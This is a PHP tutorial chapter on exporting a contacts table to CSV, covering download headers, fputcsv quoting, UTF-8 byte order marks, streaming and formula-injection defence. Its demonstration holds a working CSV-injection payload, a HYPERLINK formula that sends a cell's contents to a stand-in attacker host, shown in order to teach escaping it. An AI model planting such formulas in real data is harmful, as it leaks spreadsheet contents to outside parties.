Exporting Data Phillip Harrington

Sooner or later, someone asks for the orders, or the customers, "in Excel." A CSV file is the answer: plain text, one row per line, commas between the values, and every spreadsheet opens it. You'll build an export of a contacts table that downloads with a sensible name, streams rows straight from the database, and survives commas, quotes and every alphabet.

It also has to survive the people who filled in the table. A spreadsheet doesn't only show text; it runs formulas, and a name typed into your signup form can be one. You'll export that name the naive way, see it come out as a working formula, and then make every cell safe.

What You'll Use
  • Sending a File: Content-Type, and Content-Disposition for the download name
  • CSV: the format, and fputcsv()
  • Text and UTF-8: the byte order mark Excel wants
  • HTTP Authentication: customer data is staff only
  • Never Trust Input: input that waits in your database for a spreadsheet

    A comma in a company name, quotes in another, three alphabets, and two values that start with characters a spreadsheet treats specially. One of them is an attack.

    Step 2: Safe Cells

    spreadsheetSafe() puts an apostrophe in front of any text that starts with =, +, -, @, a tab or a carriage return. Spreadsheets read a leading apostrophe as "this is text," and don't show it. Plain numbers are left alone, so a refund of -5.00 stays a number.

    writeRow() hands each row to fputcsv(), which does the quoting: a value with a comma, quote or line break in it is wrapped in quotes, and quotes inside are doubled.

    Step 3: The Download
  • Content-Disposition: attachment tells the browser to save the response instead of showing it, and filename names the file. The name is built only from things we made: a fixed word and dates we formatted ourselves.
  • The ?since= date is input, so it must be a real date in exactly one shape, checked by parsing it and formatting it back. February 31st doesn't survive the trip.
  • The byte order mark, three bytes at the very start, is how Excel knows the file is UTF-8. Without it, Excel on Windows often guesses an older encoding, and Zoë opens as ZoÃ«.
  • The rows stream. With buffering off, PDO hands over each row as MySQL sends it, and fputcsv() writes it straight to the response. A million rows never sit in memory at once.

    Break It

    The export most people write first:

    curl http://localhost:8000/naive-export.php Name,Email,Company,Spent Ann Lee,ann@example.com,Acme, Inc.,42 Zoë Łukasiewicz,zoe@example.com,Café "Kraków",13.99 ... =HYPERLINK("https://attacker.example/?leak="&B2,"Click for details"),mallory@example.com,Totally Real Ltd,0

    Two things broke. The small one: Acme, Inc. became two cells, and Ann's row has one column too many. Every row after a stray comma is shifted and wrong.

    The big one is the fourth row. Open the file in a spreadsheet, and the name cell isn't a name. It's a link that says "Click for details," and clicking it sends the contents of cell B2, someone's email address, to attacker.example. Change the formula and it can pull in other cells, other rows, the whole sheet. Some spreadsheet programs have supported formulas that start other programs, behind a warning that people click through. This is CSV injection, also called formula injection: the attacker typed a formula into your signup form months ago, and it runs on your staff's computer the day someone exports the list.

    Fix It

    You've read this one so many times you could set it to music. Never trust input, and that includes input that's been sitting in your database. Look at the real export's version of the same row:

    "'=HYPERLINK(""https://attacker.example/?leak=""&B2,""Click for details"")",mallory@example.com,"Totally Real Ltd",0.00,"2026-11-20 08:00:00"

    Quoted, so the commas inside stay inside. Quotes doubled. And the apostrophe in front, so the spreadsheet shows the text =HYPERLINK(...) and never runs it. Then delete naive-export.php.

    Comma-separated values were in use by the early 1970s, long before personal computers, and for decades nobody wrote down exactly how they work. RFC 4180, published in 2005, finally described the common format: commas between fields, quotes around fields that need them, quotes inside doubled. It says itself that it documents a format already in wide use, with many variations, which is why every CSV reader still has to be a little forgiving. Gotchas
  • The apostrophe changes the data. A phone number like +1 (555) 0100 gets one too. If the file is going to another program, not a person with a spreadsheet, it may want the raw values. Make the safe version the default, and the raw one a deliberate choice.
  • Pass fputcsv() all its arguments. Its old default for $escape, a backslash, doesn't match how spreadsheets read quotes, and PHP 8.4 warns when you leave it out. Pass ''.
  • Never build the file name from input as-is. A quote or a line break in a Content-Disposition filename can break the header. Build it from values you formatted yourself, or strip it to letters, digits and hyphens.
  • Output before the headers ruins the download. A stray space or warning before header() means the headers can't be sent, and the browser shows a page of commas instead of saving a file.
  • An export is a copy of your data, walking out the door. Put it behind a login, log who ran it, and export only the columns people need.

    • Reading a CSV in a text editor tells you it's well formed. Opening it in Excel, LibreOffice or Google Sheets tells you whether a person can use it: whether the accents survived, the dates are dates, and the long ids didn't turn into 1.23E+15. Do both, at least once, with the ugliest data you have.
